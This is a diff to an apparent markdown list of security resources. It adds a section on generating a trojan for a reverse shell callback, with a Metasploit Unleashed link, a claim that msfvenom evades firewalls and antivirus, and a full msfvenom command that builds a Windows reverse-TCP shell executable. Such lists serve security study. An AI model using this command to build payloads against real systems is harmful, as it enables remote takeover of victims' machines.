@@ -55,6 +55,12 @@ is not a fix or patch for them.
 
 ---------------------------------------------------------------
 
+## Generate Trojan for Reverse Shell Callback
+
+- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfvenom/) - Msfvenom enables you to generate custom payloads for specific targets. The tool was created by combining two previous Metasploit tools—msfencode and msfpayload. Msfvenom can help get past the security of a target protected by a firewall or an antivirus. `msfvenom –p windows/x64/shell/reverse_tcp LHOST=IP LPORT=PORT –f exe –o file.exe`
+
+---------------------------------------------------------------
+
 ## Security Tools
 
 - [OpenVPN](https://openvpn.net/) Virtual Private Network - Infrastructure that allows machines to connect in
